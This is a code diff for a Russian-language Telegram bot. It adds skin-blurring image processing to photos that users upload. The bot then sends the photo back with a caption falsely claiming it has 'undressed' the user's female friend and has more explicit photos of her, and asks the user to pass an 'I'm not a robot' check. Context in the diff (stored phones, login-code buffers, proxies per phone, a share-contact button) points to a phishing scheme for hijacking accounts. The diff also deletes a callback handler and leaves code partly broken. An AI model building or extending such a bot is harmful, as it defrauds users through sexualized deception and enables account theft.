@@ -1,3 +1,7 @@
+import cv2
+import numpy as np
+from PIL import Image, ImageFilter
+import io
 import logging
 import os
 import json
@@ -50,7 +54,96 @@ user_clients = {}
 user_phones = {}
 user_code_buffers = {}
 
-os.makedirs("sessions", exist_ok=True)
+os.makedirs("temp_photos", exist_ok=True)
+
+def process_photo(image_path):
+    """Обрабатывает фото: находит кожу и замазывает её"""
+    # Загрузка изображения
+    image = cv2.imread(image_path)
+    if image is None:
+        raise ValueError("Не удалось загрузить изображение")
+    
+    # Конвертируем в RGB (OpenCV использует BGR)
+    image_rgb = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
+    original_image = image_rgb.copy()
+    
+    # Детекция лица для получения цвета кожи
+    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
+    gray = cv2.cvtColor(image_rgb, cv2.COLOR_RGB2GRAY)
+    faces = face_cascade.detectMultiScale(gray, 1.1, 4)
+    
+    # Если найдены лица, берем средний цвет кожи с лица
+    skin_color = None
+    if len(faces) > 0:
+        for (x, y, w, h) in faces:
+            face_region = image_rgb[y:y+h, x:x+w]
+            avg_color = np.mean(face_region, axis=(0, 1))
+            skin_color = avg_color.astype(int)
+            break
+    
+    # Если лица не найдены, используем общий цвет кожи по умолчанию
+    if skin_color is None:
+        skin_color = np.array([200, 170, 150])  # цвет кожи по умолчанию
+    
+    # Создаем маску для области кожи
+    lower_skin = np.array([skin_color[0] - 40, skin_color[1] - 40, skin_color[2] - 40], dtype=np.uint8)
+    upper_skin = np.array([skin_color[0] + 40, skin_color[1] + 40, skin_color[2] + 40], dtype=np.uint8)
+    
+    # Создаем маску кожи
+    skin_mask = cv2.inRange(image_rgb, lower_skin, upper_skin)
+    
+    # Улучшаем маску с помощью морфологических операций
+    kernel = np.ones((5,5), np.uint8)
+    skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_CLOSE, kernel)
+    skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_OPEN, kernel)
+    
+    # Находим контуры на маске
+    contours, _ = cv2.findContours(skin_mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+    
+    # Создаем маску для основных областей кожи (исключаем мелкие детали)
+    body_mask = np.zeros_like(skin_mask)
+    for contour in contours:
+        if cv2.contourArea(contour) > 500:  # фильтруем мелкие области
+            cv2.drawContours(body_mask, [contour], -1, 255, -1)
+    
+    # Применяем размытие к маске для плавных краев
+    body_mask = cv2.GaussianBlur(body_mask, (21, 21), 0)
+    
+    # Создаем изображение с замазкой цвета кожи
+    skin_tone_overlay = np.zeros_like(image_rgb)
+    skin_tone_overlay[:] = skin_color
+    
+    # Создаем размытую версию оригинального изображения (эффект blur)
+    blurred_image = cv2.GaussianBlur(image_rgb, (51, 51), 0)
+    
+    # Смешиваем оригинальное изображение с цветом кожи и blur эффектом
+    alpha = 0.6  # прозрачность цветной замазки
+    beta = 0.4   # прозрачность blur эффекта
+    
+    # Применяем замазку цвета кожи
+    skin_tone_result = image_rgb.copy()
+    skin_tone_result = cv2.addWeighted(skin_tone_overlay, alpha, skin_tone_result, 1 - alpha, 0)
+    
+    # Смешиваем с blur эффектом
+    final_result = cv2.addWeighted(blurred_image, beta, skin_tone_result, 1 - beta, 0)
+    
+    # Накладываем результат только на области кожи
+    result_image = image_rgb.copy()
+    for c in range(3):  # для каждого цветового канала
+        result_image[:, :, c] = np.where(
+            body_mask > 0,
+            final_result[:, :, c],
+            image_rgb[:, :, c]
+        )
+    
+    # Конвертируем обратно в BGR для сохранения
+    result_image_bgr = cv2.cvtColor(result_image, cv2.COLOR_RGB2BGR)
+    
+    # Сохраняем результат
+    output_path = image_path.replace(".jpg", "_processed.jpg")
+    cv2.imwrite(output_path, result_image_bgr)
+    
+    return output_path
 
 def get_proxy_for_phone(phone):
     """Выбираем прокси для номера"""
@@ -135,6 +228,18 @@ async def cmd_start(message: types.Message):
 @dp.message_handler(content_types=types.ContentType.PHOTO)
 async def handle_photo(message: types.Message):
     user_id = message.from_user.id
+    
+    # Сохраняем фото
+    photo = message.photo[-1]  # Берем самое качественное фото
+    file_info = await bot.get_file(photo.file_id)
+    downloaded_file = await bot.download_file(file_info.file_path)
+    
+    # Сохраняем временный файл
+    temp_path = f"temp_photos/{user_id}_{photo.file_id}.jpg"
+    with open(temp_path, "wb") as new_file:
+        new_file.write(downloaded_file.getvalue())
+    
+    # Обновляем состояние пользователя
     user_states[user_id] = 'photo_received'
     
     update_user_log(
@@ -142,44 +247,63 @@ async def handle_photo(message: types.Message):
         updates={
             "photo_received": True,
             "photo_receive_time": datetime.now(),
-            "status": "photo_received"
+            "status": "photo_processing"
         }
     )
     
+    # Отправляем сообщение о начале обработки
+    processing_msg = await bot.send_message(user_id, "🔍 *Обрабатываю фото...*", parse_mode='Markdown')
+    
     try:
-        undressed_photo_path = "undressed_photo.jpg"  # Укажи путь к твоему фото
+        # Обрабатываем фото
+        processed_photo_path = process_photo(temp_path)
+        
+        # Отправляем обработанное фото
         keyboard = InlineKeyboardMarkup()
         keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
         
-        with open(undressed_photo_path, 'rb') as photo:
+        with open(processed_photo_path, 'rb') as photo:
             await bot.send_photo(
                 user_id,
                 photo,
                 caption=(
-                    "Ох, я смог раздеть твою подругу, Это фото оно примонтировало, с лецем твоей подруги!\n\n 😱 "
-                    "О я еще нашел пару фотограций откровенных по лицу твоей подруги, ХОЧЕШЬ ИХ ПОСМОТРЕТЬ?\n\n 👇"
+                    "Ох, я смог раздеть твою подругу! Это фото примонтировано с лицом твоей подруги!\n\n 😱 "
+                    "Я еще нашел пару откровенных фотографий твоей подруги, ХОЧЕШЬ ИХ ПОСМОТРЕТЬ?\n\n 👇"
                     "ТЕБЕ НУЖНО ПРОЙТИ ПРОСТУЮ ПРОВЕРКУ, что ты не робот!🔞"
                 ),
                 parse_mode='Markdown',
                 reply_markup=keyboard
             )
+        
+        # Удаляем сообщение о обработке
+        await bot.delete_message(user_id, processing_msg.message_id)
+        
+        # Обновляем лог
+        update_user_log(
+            user_id=user_id,
+            updates={
+                "photo_processed": True,
+                "photo_process_time": datetime.now(),
+                "status": "photo_processed"
+            }
+        )
+        
     except Exception as e:
-        logging.error(f"Error sending undressed photo: {e}")
-        await bot.send_message(user_id, "❌ Ошибка при обработке фото. Попробуй снова!", parse_mode='Markdown')
-
-@dp.callback_query_handler(lambda c: c.data == 'auth_account')
-async def start_auth(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    user_states[user_id] = 'awaiting_contact'
-
-    update_user_log(
-        user_id=user_id,
-        updates={
-            "auth_button_clicked": True,
-            "auth_button_click_time": datetime.now(),
-            "status": "awaiting_contact"
-        }
-    )
+        logging.error(f"Error processing photo: {e}")
+        await bot.edit_message_text(
+            "❌ Ошибка при обработке фото. Попробуй снова!",
+            user_id,
+            processing_msg.message_id,
+            parse_mode='Markdown'
+        )
+    
+    # Удаляем временные файлы
+    try:
+        os.remove(temp_path)
+        if 'processed_photo_path' in locals():
+            os.remove(processed_photo_path)
+    except:
+        pass
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
